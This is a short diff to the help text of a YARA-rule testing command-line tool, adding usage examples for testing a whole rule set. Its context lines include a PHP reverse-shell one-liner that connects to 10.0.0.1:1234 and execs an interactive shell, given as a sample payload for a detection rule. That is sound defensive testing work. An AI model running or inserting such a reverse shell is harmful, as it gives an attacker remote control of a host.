@@ -171,6 +171,10 @@ class TestSubCommand:
         encobu test -P "php -r '$sock=fsockopen(\"10.0.0.1\",1234);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" -r reverse_shell.yara
         encobu test -F hack.txt -r rules/
         encobu test -F hack.txt -r rules/port_scan.yar rules/reverse_shell.yar
+
+        encobu test -A port_scan.yar reverse_shell.yar
+        encobu test -A login.yar
+        encobu test -A network_rules/
     """
 
     PAYLOAD_HELP = "The payload you want to test against different yara rules."
